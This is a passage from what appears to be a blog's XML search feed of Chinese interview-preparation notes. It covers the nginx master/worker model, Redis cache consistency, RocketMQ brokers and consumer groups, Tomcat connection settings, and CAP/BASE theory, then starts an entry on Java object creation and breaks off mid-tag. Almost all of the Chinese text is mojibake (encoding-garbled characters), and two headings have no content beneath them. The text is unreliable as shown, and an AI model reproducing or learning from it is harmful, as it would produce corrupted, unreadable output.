workerè¿›ç¨‹æ¨¡å‹ï¼Œå…è®¸å…¶è¿›è¡Œå¹³æ»‘é‡å¯å’Œé…ç½®ï¼Œä¸ä¼šæ–­å¼€å’Œå®¢æˆ·ç«¯è¿æ¥</strong>ï¼›</li><li><strong>åç¨‹æœºåˆ¶ï¼Œå®Œæˆå•è¿›ç¨‹å•çº¿ç¨‹æ¨¡å‹ï¼Œå¹¶æ”¯æŒå¹¶å‘ç¼–ç¨‹è°ƒç”¨æ¥å£</strong>ï¼›</li></ul><p>ç®¡ç†å‘˜ç†è§£ä¸ºrootæ“ä½œç”¨æˆ·ï¼Œç”¨äºå¯åŠ¨ç®¡ç†nginxè¿›ç¨‹ï¼›<br>Masterè¿›ç¨‹çš„ä¸»è¦åŠŸèƒ½ï¼š</p><ul><li><p>æ¥æ”¶æ¥è‡ªå¤–ç•Œçš„ä¿¡å·ï¼›</p></li><li><p>å‘å„ä¸ªworkerè¿›ç¨‹å‘é€ä¿¡å·ï¼›</p></li><li><p>ç›‘æ§workerè¿›ç¨‹çš„è¿è¡ŒçŠ¶æ€ï¼›</p></li><li><p>å½“workerè¿›ç¨‹åœ¨å¼‚å¸¸æƒ…å†µä¸‹é€€å‡ºåï¼Œä¼šè‡ªåŠ¨é‡å¯æ–°çš„workerè¿›ç¨‹ï¼›</p></li></ul><p>nginxä¼šå¯åŠ¨ä¸€ä¸ªmasterè¿›ç¨‹ï¼Œç„¶åæ ¹æ®é…ç½®æ–‡ä»¶å†…çš„workerè¿›ç¨‹çš„æ•°é‡å»å¯åŠ¨ç›¸åº”çš„æ•°é‡çš„workerè¿›ç¨‹ï¼Œmasterè¿›ç¨‹å’Œworkerè¿›ç¨‹æ˜¯ä¸€ä¸ªçˆ¶å­å…³ç³»ï¼›masterè¿›ç¨‹ç”¨æ¥ç®¡ç†workerè¿›ç¨‹ï¼Œworkerè¿›ç¨‹æ‰æ˜¯ç”¨æ¥ç®¡ç†å®¢æˆ·ç«¯è¿æ¥çš„ã€‚</p><p>Masterè¿›ç¨‹ä¼šå…ˆåˆ›å»ºå¥½å¯¹åº”çš„sockeå»ç›‘å¬å¯¹åº”çš„ç«¯å£ï¼Œç„¶åå†forkå‡ºå¤šä¸ªworkerè¿›ç¨‹ï¼Œmasterä¼šå¯åŠ¨ä¸€ä¸ªepollçš„å¤šè·¯å¤ç”¨æ¨¡å‹ï¼›å½“clientæƒ³è¦åœ¨socketç«¯å£å»ºç«‹ç»å…¸çš„TCPä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿æ¥çš„æ—¶å€™ï¼Œå¯¹åº”çš„epollå¤šè·¯å¤ç”¨ä¼šäº§ç”Ÿä¸€ä¸ªå›è°ƒï¼Œé€šçŸ¥æ‰€æœ‰çš„å¯ä»¥acceptçš„workerè¿›ç¨‹ï¼Œä½†åªæœ‰ä¸€ä¸ªworkerè¿›ç¨‹ä¼šæˆåŠŸï¼Œå…¶å®ƒçš„éƒ½ä¼šå¤±è´¥ã€‚</p><p>Nginxæä¾›äº†ä¸€æŠŠå…±äº«é”accept_mutexæ¥ä¿è¯åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªworkè¿›ç¨‹åœ¨acceptè¿æ¥ï¼Œä»è€Œè§£å†³é›†ç¾¤é—®é¢˜ï¼›å½“ä¸€ä¸ªworkerè¿›ç¨‹acceptè¿™ä¸ªè¿æ¥åï¼Œå°±å¼€å§‹è¯»å–è¯·æ±‚ï¼Œè§£æè¯·æ±‚ï¼Œå¤„ç†è¯·æ±‚ï¼Œäº§ç”Ÿæ•°æ®åï¼Œå†è¿”å›ç»™å®¢æˆ·ç«¯ï¼Œæœ€åæ‰æ–­å¼€è¿æ¥ï¼›</p><h3><span id="åç¨‹æœºåˆ¶">åç¨‹æœºåˆ¶</span></h3><p>ä¸€ä¸ªçº¿ç¨‹å¯ä»¥æœ‰å¤šä¸ªåç¨‹ï¼Œåç¨‹æ˜¯çº¿ç¨‹çš„å†…å­˜æ¨¡å‹</p><ul><li><p>ä¾é™„äºçº¿ç¨‹çš„å†…å­˜æ¨¡å‹ï¼Œåˆ‡æ¢å¼€é”€å°ï¼›</p></li><li><p>é‡é˜»å¡åŠå½’è¿˜æ‰§è¡Œæƒï¼Œä»£ç åŒæ­¥ï¼Œè°ƒç”¨æ–°çš„ä¸é˜»å¡çš„åç¨‹ï¼›</p></li><li><p>æ— éœ€åŠ é”ï¼›</p></li></ul><h1><span id="redis">Redis</span></h1><h2><span id="æ€ä¹ˆä¿è¯redisç¼“å­˜å’Œæ•°æ®åº“çš„ä¸€è‡´æ€§">æ€ä¹ˆä¿è¯Redisç¼“å­˜å’Œæ•°æ®åº“çš„ä¸€è‡´æ€§ï¼Ÿ</span></h2><p>åœ¨å…¶ä»–ä¸€èˆ¬è¯»å¤§äºå†™çš„åœºæ™¯ï¼Œä¸€èˆ¬å¤„ç†çš„<strong>åŸåˆ™</strong>æ˜¯ï¼š<strong>ç¼“å­˜åªåšå¤±æ•ˆï¼Œä¸åšæ›´æ–°ã€‚</strong></p><p><strong>å¤±æ•ˆ</strong>ï¼šåº”ç”¨ç¨‹åºå…ˆä»cacheå–æ•°æ®ï¼Œæ²¡æœ‰å¾—åˆ°ï¼Œåˆ™ä»æ•°æ®åº“ä¸­å–æ•°æ®ï¼ŒæˆåŠŸåï¼Œæ”¾åˆ°ç¼“å­˜ä¸­ã€‚</p><p><strong>æ›´æ–°</strong>ï¼šå…ˆæŠŠæ•°æ®å­˜åˆ°æ•°æ®åº“ä¸­ï¼ŒæˆåŠŸåï¼Œå†è®©ç¼“å­˜å¤±æ•ˆã€‚</p><h2><span id="é›ªå´©">é›ªå´©</span></h2><h2><span id="æ›´æ–°åº“å­˜é—®é¢˜">æ›´æ–°åº“å­˜é—®é¢˜</span></h2><h1><span id="mq">MQ</span></h1><p><strong>Producerè§£å†³æ¶ˆæ¯ç”Ÿäº§çš„é—®é¢˜,Consumeræ¶ˆæ¯çš„æ¶ˆè´¹ç«¯</strong><br><strong>Broker</strong><br>ç›¸å½“äºä¸€ä¸ªä¸­é—´äººï¼Œ<strong>ç”±topicå’ŒMessageQueueç»„æˆ</strong>ï¼Œä»»ä½•ä¸€æ¡rocketmqçš„æ¶ˆæ¯éƒ½æ˜¯éš¶å±äºæŸä¸€ä¸ªtopic,ä¸€ä¸ªtopicå¯ä»¥è¢«ä¸€ä¸ªmessagebrokerç®¡ç†ï¼Œä¹Ÿå¯ä»¥è¢«å¤šä¸ªmessagebrokerç®¡ç†ï¼›</p><p>Brokerå‘Nameserverå‘é€æ³¨å†Œè¯·æ±‚ï¼Œbrokerçš„ipå’Œè´Ÿè´£çš„topic,queueï¼›<br>æ¯ä¸€ä¸ªbrokerè‡³å°‘æœ‰ä¸€ä¸ªqueue,producerä»Nameserverä¸Šå‘ç°broker1ï¼›</p><p>é‡‡ç”¨è´Ÿè½½è½®è¯¢çš„æ–¹å¼ç¬¬ä¸€æ¬¡è¯·æ±‚åˆ°queue1ä¸­ï¼Œç”Ÿæˆä¸€ä¸ªmessage1,ç¬¬äºŒæ¬¡è¯·æ±‚åˆ°queue2,ç”Ÿæˆä¸€ä¸ªmessage2,åŒæ—¶consumerä¼šå‘è¿™ä¸¤ä¸ªqueueåˆ†åˆ«å»ºç«‹é•¿è¿æ¥ã€‚<br>å½“produceråšå¯¹åº”æŠ•é€’æ—¶ï¼Œconsumerä¼šè¢«å”¤é†’ï¼Œæ‹‰å–å¯¹åº”çš„message,è¿™ç§æ–¹å¼è¢«ç§°ä¸ºé•¿è½®è¯¢ï¼›<br><strong>Consumer groupçš„ä½œç”¨</strong>ï¼šä»¥queueä¸ºå•ä½ä½œä¸ºä¸€ä¸ªæ¶ˆæ¯çš„ç®¡ç†ï¼Œå½“consumeræ¶ˆè´¹å®Œä¸€ä¸ªmessageçš„æ—¶å€™ä¼šå›å¤ä¸€ä¸ªæ¶ˆæ¯ç»™å¯¹åº”çš„queue,å¹¶ä¸”å°†å¯¹åº”çš„message2å˜ä¸ºå·²ç»æ¶ˆè´¹æˆåŠŸè¦è¢«å¹²æ‰çš„çŠ¶æ€ï¼›</p><p>è‹¥å¯¹åº”çš„<strong>ä¸€ä¸ªqueueè¢«å¤šä¸ªconsumeræ¶ˆè´¹</strong>çš„æƒ…å†µä¸‹ï¼ŒåŠ¿å¿…ä¼šé€ æˆä¸€ä¸ªåŒæ­¥çš„é—®é¢˜ï¼Œå­˜åœ¨ä¸€ä¸ª<strong>é”ç«äº‰</strong>çš„æœºåˆ¶ï¼Œrocketmqé‡‡ç”¨çš„æ˜¯ä»¥queueä¸ºå•ä½å¹³å‡çš„åˆ†é…ç»™consumer,æ‰€ä»¥è®¾è®¡ä¸€ä¸ªå¥½çš„ä¸­é—´ä»¶å°±æ˜¯ä¸ºäº†ä¿è¯<strong>queueå’Œconsumer</strong>çš„æ•°é‡ç›¸ç­‰ï¼›</p><p>å½“æœ‰å¤šä¸ªconsumer group,<strong>ä¸€ä¸ªè®¢å•ç³»ç»Ÿ</strong>å°±å±äºä¸€ä¸ªgroup,å¦å¤–ä¸€ä¸ªconsumer groupå°±å±äº<strong>å•†å“ç³»ç»Ÿ</strong>ï¼›ç”Ÿäº§è€…ç«¯å¹¶ä¸çŸ¥é“ç”Ÿæˆçš„æ¶ˆæ¯å¯¹åº”çš„æ¶ˆè´¹ç«¯æ˜¯å“ªä¸ªç³»ç»Ÿï¼Œåªä¼šæ— è„‘çš„æŠ•æ¶ˆæ¯ï¼Œå…³æ³¨è¿™ä¸ªæ¶ˆæ¯çš„äººæŒ‡å‡ºæ¥å³å¯ã€‚<strong>topicA</strong>è¿˜æ˜¯ä»¥consumer_groupä¸ºç®¡ç†çš„åŸºç¡€å•å…ƒï¼Œä¸€ä¸ªqueue1å¯ä»¥è¢«ä¸€ä¸ªconsumer groupä¸­çš„ä¸€ä¸ªconsumeræ‰€æ¶ˆè´¹ï¼Œä¹Ÿå¯ä»¥è¢«å¦ä¸€ä¸ªconsumer groupä¸­çš„consumeræ‰€æ¶ˆè´¹ï¼Œ<strong>ä»¥consumer_groupå»åšå¯¹åº”æ¶ˆæ¯çš„æ¶ˆè´¹å’Œç®¡ç†</strong>ã€‚</p><p>å¦‚æœå¯¹åº”çš„broker1äº§ç”Ÿäº†ä»»ä½•å¼‚å¸¸ï¼ŒproducerçŸ¥é“brokeræ‰çº¿äº†ï¼Œæ²¡åŠæ³•æŠ•é€’å¯¹åº”çš„æ¶ˆæ¯ï¼›</p><p>broker2ä½œä¸ºbroker1çš„slave,å¹³æ—¶ä¸å¯¹å¤–è¿›è¡ŒæœåŠ¡ï¼Œåªåšæ¶ˆæ¯çš„ä»åº“ï¼Œä¸€æ—¦å¯¹åº”çš„message1è¢«æ¶ˆè´¹ï¼›ä¸€æ—¦broker1å‘ç”Ÿå¼‚å¸¸ï¼Œnameserveræ„ŸçŸ¥åˆ°ä¼šå°†broker2å˜ä¸ºä¸»åº“ï¼Œå¹¶ä¸”é€šçŸ¥producerå’Œconsumerç«¯ï¼Œè®©å…¶é€šè¿‡broker2å»æ¥ç®¡å¯¹åº”çš„æ¶ˆè´¹ï¼Œslaveå’Œmasterä¹‹é—´çš„æ•°æ®å¯ä»¥æ˜¯åŒæ­¥ï¼Œä¹Ÿå¯ä»¥æ˜¯å¼‚æ­¥ã€‚</p><p>åŒæ­¥çš„è¯ï¼Œproducerç”Ÿæˆåœ¨broker1ä¸­ç”Ÿäº§message1æˆåŠŸï¼Œä¹Ÿè¦broker2ä¸­å¤‡ä»½message1ä¹Ÿèƒ½å¤ŸæˆåŠŸï¼Œæ€§èƒ½åä½ï¼›</p><p>ä¸»broker1ä½œä¸ºç”Ÿäº§æˆåŠŸ\æ¶ˆè´¹æˆåŠŸå³å¯,roker2åšå¼‚æ­¥å¤åˆ¶å³å¯ã€‚åªè¦ç½‘ç»œçš„å»¶è¿Ÿå°ï¼Œå¯¹åº”çš„cpuå¤„ç†é€Ÿåº¦å¿«ï¼Œæ˜¯ä¸ä¼šå‘ç”Ÿæ¶ˆæ¯ä¸¢å¤±çš„æƒ…å†µã€‚ä½†æ˜¯åœ¨åˆ†å¸ƒå¼çš„ç¯å¢ƒä¸‹ï¼Œæ²¡æœ‰åŠæ³•åŒæ—¶ä¿è¯å¼ºä¸€è‡´æ€§å’Œå¯ç”¨æ€§ã€‚å¦‚æœé€‰æ‹©å¼ºå¯ç”¨æ€§è‚¯å®šä¼šé™ä½å¼ºä¸€è‡´æ€§ï¼Œå½“å‘ç”Ÿä¸»å¤‡åˆ‡æ¢çš„æ—¶å€™å¯èƒ½ä¼šå‘ç”Ÿæ¶ˆæ¯çš„ä¸¢å¤±ã€‚</p><ul><li><strong>æ¶ˆæ¯é˜Ÿåˆ—äº‹åŠ¡å‹æ¶ˆæ¯åŸºäº â€œäºŒé˜¶æ®µâ€ æ¶ˆæ¯å®ç°ï¼›</strong></li><li><strong>äº‹åŠ¡å‹æ¶ˆæ¯æ˜¯å¦æŠ•é€’ä¸æ¶ˆæ¯å‘å¸ƒè€…æœ¬åœ°äº‹åŠ¡çŠ¶æ€ä¿æŒä¸€è‡´ï¼›</strong></li><li><strong>äº‹åŠ¡å‹æ¶ˆæ¯çŠ¶æ€å›æŸ¥æ˜¯ä¿è¯äº† â€œäº‹åŠ¡å‹æ¶ˆæ¯â€ çš„ä¸¥è°¨æ€§ã€‚</strong></li><li>ä»€ä¹ˆå«äº‹åŠ¡æ€§å‘¢ï¼Ÿå°±æ˜¯ä¿è¯æ•°æ®åº“çš„äº‹åŠ¡æäº¤ï¼Œåªè¦äº‹åŠ¡æäº¤äº†å°±ä¸€å®šä¼šä¿è¯æ¶ˆæ¯å‘é€æˆåŠŸã€‚æ•°æ®åº“å†…äº‹åŠ¡å›æ»šäº†ï¼Œæ¶ˆæ¯å¿…å®šä¸å‘é€ï¼Œäº‹åŠ¡æäº¤æœªçŸ¥ï¼Œæ¶ˆæ¯ä¹Ÿå¤„äºä¸€ä¸ªç­‰å¾…çš„çŠ¶æ€ï¼›</li></ul><h1><span id="tomcat">Tomcat</span></h1><p>server.tomcat.accept-count:ç­‰å¾…é˜Ÿåˆ—é•¿åº¦ã€‚é»˜è®¤100ï¼›<br>server.tomcat.max-connections:æœ€å¤§å¯è¢«è¿æ¥æ•°ï¼Œé»˜è®¤10000<br>server.tomcat.max-threads:æœ€å¤§å·¥ä½œçº¿ç¨‹æ•°ï¼Œé»˜è®¤200<br>server.tomcat.min-spare-threads:æœ€å°çº¿ç¨‹æ•°ï¼Œé»˜è®¤10<br>é»˜è®¤é…ç½®ä¸‹ï¼Œè¿æ¥è¶…è¿‡10000åå‡ºç°æ‹’ç»è¿æ¥æƒ…å†µï¼›<br>é»˜è®¤é…ç½®ä¸‹ï¼Œè§¦å‘çš„è¯·æ±‚è¶…è¿‡200+100åæ‹’ç»å¤„ç†ï¼›<br>å®šåˆ¶åŒ–å†…åµŒTomcatå¼€å‘</p><p>keepAliveTimeOut:å¤šå°‘æ¯«ç§’åä¸å“åº”çš„æ–­å¼€keepalive(è®¾ç½®åœ¨æœåŠ¡ç«¯ä¸Š)<br>maxKeepAliveRequests:å¤šå°‘æ¬¡è¯·æ±‚åkeepaliveæ–­å¼€å¤±æ•ˆ<br>ä½¿ç”¨WebServerFactoryCustomizer<configurableservletwebserverfactory>å®šåˆ¶åŒ–å†…åµŒtomcaté…ç½®</configurableservletwebserverfactory></p><h1><span id="cap">CAP</span></h1><p>åˆ†å¸ƒå¼ç³»ç»Ÿä¸å¯èƒ½åŒæ—¶æ»¡è¶³ä¸€è‡´æ€§ï¼ˆCï¼šConsistencyï¼‰ã€å¯ç”¨æ€§ï¼ˆAï¼šAvailabilityï¼‰å’Œåˆ†åŒºå®¹å¿æ€§ï¼ˆPï¼šPartition Toleranceï¼‰ï¼Œæœ€å¤šåªèƒ½åŒæ—¶æ»¡è¶³å…¶ä¸­ä¸¤é¡¹ã€‚</p><h2><span id="ä¸€è‡´æ€§">ä¸€è‡´æ€§</span></h2><p>ä¸€è‡´æ€§æŒ‡çš„æ˜¯å¤šä¸ªæ•°æ®å‰¯æœ¬æ˜¯å¦èƒ½ä¿æŒä¸€è‡´çš„ç‰¹æ€§ï¼Œåœ¨ä¸€è‡´æ€§çš„æ¡ä»¶ä¸‹ï¼Œç³»ç»Ÿåœ¨æ‰§è¡Œæ•°æ®æ›´æ–°æ“ä½œä¹‹åèƒ½å¤Ÿä»ä¸€è‡´æ€§çŠ¶æ€è½¬ç§»åˆ°å¦ä¸€ä¸ªä¸€è‡´æ€§çŠ¶æ€ã€‚</p><p>å¯¹ç³»ç»Ÿçš„ä¸€ä¸ªæ•°æ®æ›´æ–°æˆåŠŸä¹‹åï¼Œå¦‚æœæ‰€æœ‰ç”¨æˆ·éƒ½èƒ½å¤Ÿè¯»å–åˆ°æœ€æ–°çš„å€¼ï¼Œè¯¥ç³»ç»Ÿå°±è¢«è®¤ä¸ºå…·æœ‰å¼ºä¸€è‡´æ€§ã€‚</p><h2><span id="å¯ç”¨æ€§">å¯ç”¨æ€§</span></h2><p>å¯ç”¨æ€§æŒ‡åˆ†å¸ƒå¼ç³»ç»Ÿåœ¨é¢å¯¹å„ç§å¼‚å¸¸æ—¶å¯ä»¥æä¾›æ­£å¸¸æœåŠ¡çš„èƒ½åŠ›ï¼Œå¯ä»¥ç”¨ç³»ç»Ÿå¯ç”¨æ—¶é—´å æ€»æ—¶é—´çš„æ¯”å€¼æ¥è¡¡é‡ï¼Œ4 ä¸ª 9 çš„å¯ç”¨æ€§è¡¨ç¤ºç³»ç»Ÿ 99.99% çš„æ—¶é—´æ˜¯å¯ç”¨çš„ã€‚</p><p>åœ¨å¯ç”¨æ€§æ¡ä»¶ä¸‹ï¼Œè¦æ±‚ç³»ç»Ÿæä¾›çš„æœåŠ¡ä¸€ç›´å¤„äºå¯ç”¨çš„çŠ¶æ€ï¼Œå¯¹äºç”¨æˆ·çš„æ¯ä¸€ä¸ªæ“ä½œè¯·æ±‚æ€»æ˜¯èƒ½å¤Ÿåœ¨æœ‰é™çš„æ—¶é—´å†…è¿”å›ç»“æœã€‚</p><h2><span id="åˆ†åŒºå®¹å¿æ€§">åˆ†åŒºå®¹å¿æ€§</span></h2><p>ç½‘ç»œåˆ†åŒºæŒ‡åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„èŠ‚ç‚¹è¢«åˆ’åˆ†ä¸ºå¤šä¸ªåŒºåŸŸï¼Œæ¯ä¸ªåŒºåŸŸå†…éƒ¨å¯ä»¥é€šä¿¡ï¼Œä½†æ˜¯åŒºåŸŸä¹‹é—´æ— æ³•é€šä¿¡ã€‚</p><p>åœ¨åˆ†åŒºå®¹å¿æ€§æ¡ä»¶ä¸‹ï¼Œåˆ†å¸ƒå¼ç³»ç»Ÿåœ¨é‡åˆ°ä»»ä½•ç½‘ç»œåˆ†åŒºæ•…éšœçš„æ—¶å€™ï¼Œä»ç„¶éœ€è¦èƒ½å¯¹å¤–æä¾›ä¸€è‡´æ€§å’Œå¯ç”¨æ€§çš„æœåŠ¡ï¼Œé™¤éæ˜¯æ•´ä¸ªç½‘ç»œç¯å¢ƒéƒ½å‘ç”Ÿäº†æ•…éšœã€‚</p><h2><span id="æƒè¡¡">æƒè¡¡</span></h2><p>åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œåˆ†åŒºå®¹å¿æ€§å¿…ä¸å¯å°‘ï¼Œå› ä¸ºéœ€è¦æ€»æ˜¯å‡è®¾ç½‘ç»œæ˜¯ä¸å¯é çš„ã€‚å› æ­¤ï¼ŒCAP ç†è®ºå®é™…ä¸Šæ˜¯è¦åœ¨å¯ç”¨æ€§å’Œä¸€è‡´æ€§ä¹‹é—´åšæƒè¡¡ã€‚</p><p>å¯ç”¨æ€§å’Œä¸€è‡´æ€§å¾€å¾€æ˜¯å†²çªçš„ï¼Œå¾ˆéš¾ä½¿å®ƒä»¬åŒæ—¶æ»¡è¶³ã€‚åœ¨å¤šä¸ªèŠ‚ç‚¹ä¹‹é—´è¿›è¡Œæ•°æ®åŒæ­¥æ—¶ï¼Œ</p><ul><li>ä¸ºäº†ä¿è¯ä¸€è‡´æ€§ï¼ˆCPï¼‰ï¼Œä¸èƒ½è®¿é—®æœªåŒæ­¥å®Œæˆçš„èŠ‚ç‚¹ï¼Œä¹Ÿå°±å¤±å»äº†éƒ¨åˆ†å¯ç”¨æ€§ï¼›</li><li>ä¸ºäº†ä¿è¯å¯ç”¨æ€§ï¼ˆAPï¼‰ï¼Œå…è®¸è¯»å–æ‰€æœ‰èŠ‚ç‚¹çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®å¯èƒ½ä¸ä¸€è‡´ã€‚</li></ul><h1><span id="base">BASE</span></h1><p>BASE æ˜¯åŸºæœ¬å¯ç”¨ï¼ˆBasically Availableï¼‰ã€è½¯çŠ¶æ€ï¼ˆSoft Stateï¼‰å’Œæœ€ç»ˆä¸€è‡´æ€§ï¼ˆEventually Consistentï¼‰ä¸‰ä¸ªçŸ­è¯­çš„ç¼©å†™ã€‚</p><p>BASE ç†è®ºæ˜¯å¯¹ CAP ä¸­ä¸€è‡´æ€§å’Œå¯ç”¨æ€§æƒè¡¡çš„ç»“æœï¼Œå®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šå³ä½¿æ— æ³•åšåˆ°å¼ºä¸€è‡´æ€§ï¼Œä½†æ¯ä¸ªåº”ç”¨éƒ½å¯ä»¥æ ¹æ®è‡ªèº«ä¸šåŠ¡ç‰¹ç‚¹ï¼Œé‡‡ç”¨é€‚å½“çš„æ–¹å¼æ¥ä½¿ç³»ç»Ÿè¾¾åˆ°æœ€ç»ˆä¸€è‡´æ€§ã€‚</p><h2><span id="åŸºæœ¬å¯ç”¨">åŸºæœ¬å¯ç”¨</span></h2><p>æŒ‡åˆ†å¸ƒå¼ç³»ç»Ÿåœ¨å‡ºç°æ•…éšœçš„æ—¶å€™ï¼Œä¿è¯æ ¸å¿ƒå¯ç”¨ï¼Œå…è®¸æŸå¤±éƒ¨åˆ†å¯ç”¨æ€§ã€‚</p><p>ä¾‹å¦‚ï¼Œç”µå•†åœ¨åšä¿ƒé”€æ—¶ï¼Œä¸ºäº†ä¿è¯è´­ç‰©ç³»ç»Ÿçš„ç¨³å®šæ€§ï¼Œéƒ¨åˆ†æ¶ˆè´¹è€…å¯èƒ½ä¼šè¢«å¼•å¯¼åˆ°ä¸€ä¸ªé™çº§çš„é¡µé¢ã€‚</p><h2><span id="è½¯çŠ¶æ€">è½¯çŠ¶æ€</span></h2><p>æŒ‡å…è®¸ç³»ç»Ÿä¸­çš„æ•°æ®å­˜åœ¨ä¸­é—´çŠ¶æ€ï¼Œå¹¶è®¤ä¸ºè¯¥ä¸­é—´çŠ¶æ€ä¸ä¼šå½±å“ç³»ç»Ÿæ•´ä½“å¯ç”¨æ€§ï¼Œå³å…è®¸ç³»ç»Ÿä¸åŒèŠ‚ç‚¹çš„æ•°æ®å‰¯æœ¬ä¹‹é—´è¿›è¡ŒåŒæ­¥çš„è¿‡ç¨‹å­˜åœ¨æ—¶å»¶ã€‚</p><h2><span id="æœ€ç»ˆä¸€è‡´æ€§">æœ€ç»ˆä¸€è‡´æ€§</span></h2><p>æœ€ç»ˆä¸€è‡´æ€§å¼ºè°ƒçš„æ˜¯ç³»ç»Ÿä¸­æ‰€æœ‰çš„æ•°æ®å‰¯æœ¬ï¼Œåœ¨ç»è¿‡ä¸€æ®µæ—¶é—´çš„åŒæ­¥åï¼Œæœ€ç»ˆèƒ½è¾¾åˆ°ä¸€è‡´çš„çŠ¶æ€ã€‚</p><p>ACID è¦æ±‚å¼ºä¸€è‡´æ€§ï¼Œé€šå¸¸è¿ç”¨åœ¨ä¼ ç»Ÿçš„æ•°æ®åº“ç³»ç»Ÿä¸Šã€‚è€Œ BASE è¦æ±‚æœ€ç»ˆä¸€è‡´æ€§ï¼Œé€šè¿‡ç‰ºç‰²å¼ºä¸€è‡´æ€§æ¥è¾¾åˆ°å¯ç”¨æ€§ï¼Œé€šå¸¸è¿ç”¨åœ¨å¤§å‹åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ã€‚</p><p>åœ¨å®é™…çš„åˆ†å¸ƒå¼åœºæ™¯ä¸­ï¼Œä¸åŒä¸šåŠ¡å•å…ƒå’Œç»„ä»¶å¯¹ä¸€è‡´æ€§çš„è¦æ±‚æ˜¯ä¸åŒçš„ï¼Œå› æ­¤ ACID å’Œ BASE å¾€å¾€ä¼šç»“åˆåœ¨ä¸€èµ·ä½¿ç”¨ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¡¹ç›® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é˜¿é‡Œé¢è¯•</title>
      <link href="/2020/04/08/DBQA/"/>
      <url>/2020/04/08/DBQA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ç›˜ç‚¹äº†é˜¿é‡Œé¢è¯•é¢˜</p><span id="more"></span><!-- toc --><ul><li><a href="#java">Java</a><ul><li><a href="#java-new%E4%B8%80%E4%B8%AA%E5%AF%B9%E8%B1%A1%E7%9A%84%E8%BF%87%E7%A8%8B%E4%B8%AD%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88">java newä¸€ä¸ªå¯¹è±¡çš„è¿‡ç¨‹ä¸­å‘ç”Ÿäº†ä»€ä¹ˆ</a></li></ul></li><li><a href="#%E5%93%88%E5%B8%8C">å“ˆå¸Œ</a><ul><li><a href="#%E8%A7%A3%E5%86%B3%E5%93%88%E5%B8%8C%E7%A2%B0%E6%92%9E%E7%9A%84%E6%96%B9%E6%B3%95">è§£å†³å“ˆå¸Œç¢°æ’çš„æ–¹æ³•</a></li></ul></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93">æ•°æ®åº“</a><ul><li><a href="#%E4%B8%BB%E9%94%AE%E5%92%8C%E5%94%AF%E4%B8%80%E7%B4%A2%E5%BC%95%E7%9A%84%E5%8C%BA%E5%88%AB%E4%BB%A5%E5%8F%8A%E7%B4%A2%E5%BC%95%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9">ä¸»é”®å’Œå”¯ä¸€ç´¢å¼•çš„åŒºåˆ«ä»¥åŠç´¢å¼•çš„ä¼˜ç¼ºç‚¹</a></li></ul></li></ul><!-- tocstop --><h1><span id="java">Java</span></h1><h2><span id="java-newä¸€ä¸ªå¯¹è±¡çš„è¿‡ç¨‹ä¸­å‘ç”Ÿäº†ä»€ä¹ˆ">java newä¸€ä¸ªå¯¹è±¡çš„è¿‡ç¨‹ä¸­å‘ç”Ÿäº†ä»€ä¹ˆ</span></h2><p>javaåœ¨newä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œä¼šå…ˆæŸ¥çœ‹å¯¹è±¡æ‰€å±çš„ç±»æœ‰æ²¡æœ‰è¢«åŠ è½½åˆ°å†…å­˜ï¼Œå¦‚æœæ²¡æœ‰çš„è¯ï¼Œå°±ä¼šå…ˆé€šè¿‡ç±»çš„å…¨é™å®šåæ¥åŠ è½½ã€‚åŠ è½½å¹¶åˆå§‹åŒ–ç±»å®Œæˆåï¼Œå†è¿›è¡Œå¯¹è±¡çš„åˆ›å»ºå·¥ä½œã€‚</p><p>æˆ‘ä»¬å…ˆå‡è®¾æ˜¯ç¬¬ä¸€æ¬¡ä½¿ç”¨è¯¥ç±»ï¼Œè¿™æ ·çš„è¯newä¸€ä¸ªå¯¹è±¡å°±å¯ä»¥åˆ†ä¸ºä¸¤ä¸ªè¿‡ç¨‹ï¼š<strong>åŠ è½½å¹¶åˆå§‹åŒ–ç±»</strong>å’Œ<strong>åˆ›å»ºå¯¹è±¡</strong>ã€‚</p><p>ç±»åŠ è½½å’Œåˆå§‹åŒ–è¿‡ç¨‹ç•¥</p><p><strong>1ã€åœ¨å †åŒºåˆ†é…å¯¹è±¡éœ€è¦çš„å†…å­˜</strong></p><p>ã€€ã€€åˆ†é…çš„å†…å­˜åŒ…æ‹¬æœ¬ç±»å’Œçˆ¶ç±»çš„æ‰€æœ‰å®ä¾‹å˜é‡ï¼Œä½†ä¸åŒ…æ‹¬ä»»ä½•é™æ€å˜é‡</p><p><strong>2ã€å¯¹æ‰€æœ‰å®ä¾‹å˜é‡èµ‹é»˜è®¤å€¼</strong></p><p>ã€€ã€€å°†æ–¹æ³•åŒºå†…å¯¹å®ä¾‹å˜é‡çš„å®šä¹‰æ‹·è´ä¸€ä»½åˆ°å †åŒºï¼Œç„¶åèµ‹é»˜è®¤å€¼</p><p><strong>3ã€æ‰§è¡Œå®ä¾‹åˆå§‹åŒ–ä»£ç </strong></p><p>ã€€ã€€åˆå§‹åŒ–é¡ºåºæ˜¯å…ˆåˆå§‹åŒ–çˆ¶ç±»å†åˆå§‹åŒ–å­ç±»ï¼Œåˆå§‹åŒ–æ—¶å…ˆæ‰§è¡Œå®ä¾‹ä»£ç å—ç„¶åæ˜¯æ„é€ æ–¹æ³•</p><p><strong>4ã€å¦‚æœæœ‰ç±»ä¼¼äºChild c &#x3D; new Child()å½¢å¼çš„cå¼•ç”¨çš„è¯ï¼Œåœ¨æ ˆåŒºå®šä¹‰Childç±»å‹å¼•ç”¨å˜é‡cï¼Œç„¶åå°†å †åŒºå¯¹è±¡çš„åœ°å€èµ‹å€¼ç»™å®ƒ</strong></p><h1><span id="å“ˆå¸Œ">å“ˆå¸Œ</span></h1><h2><span 